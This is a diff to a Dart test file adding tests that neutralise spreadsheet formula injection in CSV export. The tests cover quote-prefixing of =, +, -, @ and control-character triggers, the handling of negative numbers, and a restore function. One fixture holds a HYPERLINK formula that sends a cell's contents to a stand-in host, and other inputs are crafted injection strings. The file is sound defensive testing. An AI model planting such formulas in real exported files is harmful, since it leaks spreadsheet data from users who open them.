@@ -66,4 +66,54 @@ void main() {
       'fila 3 UNKNOWN_MUNICIPALITY',
     ]);
   });
+
+  group('SEC-3', () {
+    test('SEC-3: prefixes every formula trigger with a quote', () {
+      for (final value in ['=1+1', '+5355551234', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd']) {
+        expect(Csv.neutralizeFormula(value), "'$value", reason: 'value ${value.codeUnits}');
+      }
+    });
+
+    test('SEC-3: a HYPERLINK formula goes out as quoted text', () {
+      final text = Csv.encode([
+        ['notas'],
+        ['=HYPERLINK("https://example.test/?"&A1;"ver")'],
+      ]);
+
+      expect(text, contains('"\'=HYPERLINK(""https://example.test/?""&A1;""ver"")"'));
+      expect(Csv.decode(text)[1].single, '\'=HYPERLINK("https://example.test/?"&A1;"ver")');
+    });
+
+    test('SEC-3: negative numbers stay numbers', () {
+      for (final value in ['-150', '-150,00', '-1.234,56', '-1234.5', '0', '12,5']) {
+        expect(Csv.neutralizeFormula(value), value);
+      }
+      expect(
+        Csv.encode([
+          ['-1.234,56', '-5'],
+        ]),
+        '${Csv.bom}-1.234,56;-5\r\n',
+      );
+    });
+
+    test('SEC-3: values that only look like numbers are still neutralised', () {
+      for (final value in ['-1+2', '-1,5)*cmd', '-', '+1', '-A1']) {
+        expect(Csv.neutralizeFormula(value), "'$value");
+      }
+    });
+
+    test('SEC-3: plain text and empty cells are unchanged', () {
+      for (final value in ['', 'Rosa', "'ya citado", 'Calle 10 - esquina', '5352223344']) {
+        expect(Csv.neutralizeFormula(value), value);
+      }
+    });
+
+    test('SEC-3: restoreFormula undoes the prefix and nothing else', () {
+      for (final value in ['=1+1', '+5355551234', '-2+3', '@SUM(A1)', '\tcmd']) {
+        expect(Csv.restoreFormula(Csv.neutralizeFormula(value)), value);
+      }
+      expect(Csv.restoreFormula("'Pepe"), "'Pepe");
+      expect(Csv.restoreFormula("'"), "'");
+    });
+  });
 }
